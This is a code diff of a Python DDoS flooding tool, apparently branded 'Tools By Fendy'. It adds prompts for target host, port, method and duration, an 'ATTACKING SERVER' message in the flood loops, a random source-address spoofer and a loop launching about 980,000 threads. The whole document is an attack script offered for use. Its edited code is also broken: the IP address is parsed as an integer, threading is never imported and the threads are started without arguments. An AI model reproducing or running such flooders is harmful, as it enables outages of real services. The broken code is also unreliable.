@@ -2,7 +2,6 @@ import random
 import socket
 import sys
 import time
-from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
 
 def spoofer():
     addr = [192, 168, 0, 1]
@@ -13,6 +12,25 @@ def spoofer():
     addr[3] = str(random.randrange(2, 254))
     assembled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
     return assembled
+
+print('''\033[97m
+
+
+
+
+▒█▀▀▀ ▒█▀▀▀ ▒█▄░▒█ ▒█▀▀▄ ▒█░░▒█ 
+▒█▀▀▀ ▒█▀▀▀ ▒█▒█▒█ ▒█░▒█ ▒█▄▄▄█ 
+▒█░░░ ▒█▄▄▄ ▒█░░▀█ ▒█▄▄▀ ░░▒█░░
+\033[91mTools By Fendy
+
+
+
+''')
+
+ip = int(input("\033[91m===> [ ? ] HOST/IP :"))
+port = int(input("\033[91m===> [ ? ] PORT :"))
+method = str(input("\033[91m===> [ ? ]METHOD :"))
+duration = int(input("\033[91m===> [ ? ]DURATION :"))
 
 def ddos(ip, port, method, duration):
     try:
@@ -39,6 +57,9 @@ def ddos(ip, port, method, duration):
             s.connect((ip, port))
             while time.time() - start_time < duration:
                 s.sendall(request.encode())
+                print("\033[91m[ + ] ATTACKING SERVER !!")
+
+                
 
         if method == "TCP":
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -46,6 +67,7 @@ def ddos(ip, port, method, duration):
             s.connect((ip, port))
             while time.time() - start_time < duration:
                 s.sendall(request.encode())
+                print("\033[91m[ + ] ATTACKING SERVER !!")
 
     except ConnectionResetError:
         pass
@@ -65,21 +87,10 @@ if __name__ == "__main__":
 
     with open("https.txt", "r") as proxy_file:
         https = proxy_file.readlines()
-
-    if len(sys.argv) != 5:
-        print(f"Usage: python3 {sys.argv[0]} <ip> <port> <method> <time>")
-        sys.exit(1)
-
-    ip = sys.argv[1]
-    port = int(sys.argv[2])
-    method = sys.argv[3]
-    duration = int(sys.argv[4])
-
-    threads = []
-
-    with ThreadPoolExecutor(max_workers=100) as executor:
-        for y in range(980005):
-            executor.submit(ddos, ip, port, method, duration)
+    
+for y in range(980005):
+    th = threading.Thread(target = ddos)
+    th.start()
 
     time.sleep(duration)
     print(f"Attacks End {duration}s")
